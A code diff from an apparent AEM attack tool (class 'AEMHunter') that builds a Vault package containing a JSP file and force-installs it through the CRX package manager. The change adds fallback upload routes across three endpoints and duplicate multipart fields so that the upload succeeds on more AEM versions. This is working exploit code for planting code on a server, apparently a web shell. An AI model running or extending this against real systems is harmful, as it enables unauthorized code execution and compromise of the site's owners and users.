@@ -1260,19 +1260,29 @@ class AEMHunter:
             pkgpath = f"/etc/packages/{grp}/{name}.zip"
             zipbytes = self._build_vault_package(grp, name, {rel: jsp})
 
-            # upload (install=true one-shot), try legacy .jsp then .json
+            # Send BOTH multipart field names ("package" and "file") — different
+            # AEM versions expect different ones; the legacy .jsp upload form uses
+            # "file". (Dropping "file" makes some instances reject the upload.)
+            mp = {"package": (name + ".zip", zipbytes, "application/zip"),
+                  "file": (name + ".zip", zipbytes, "application/zip")}
+            # upload (install=true one-shot), try legacy .jsp then .json then path-scoped
             up = self.client.post("/crx/packmgr/service.jsp",
                                   data={"cmd": "upload", "name": name, "force": "true", "install": "true"},
-                                  files={"package": (name + ".zip", zipbytes, "application/zip")},
-                                  headers=headers)
-            if not (self._pkg_success(up) or (up and up.status_code in (200, 201))):
-                up = self.client.post("/crx/packmgr/service/.json", params={"cmd": "upload"},
-                                      data={"name": name, "force": "true", "install": "true"},
-                                      files={"package": (name + ".zip", zipbytes, "application/zip")},
-                                      headers=headers)
-            last_status = getattr(up, "status_code", "ERR")
+                                  files=mp, headers=headers)
             ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
             uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
+            if not uploaded:
+                up = self.client.post("/crx/packmgr/service/.json", params={"cmd": "upload"},
+                                      data={"name": name, "force": "true", "install": "true"},
+                                      files=mp, headers=headers)
+                ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
+                uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
+            if not uploaded:
+                up = self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "upload"},
+                                      data={"force": "true", "install": "true"}, files=mp, headers=headers)
+                ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
+                uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
+            last_status = getattr(up, "status_code", "ERR")
             if uploaded:
                 any_upload = True
                 inst = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
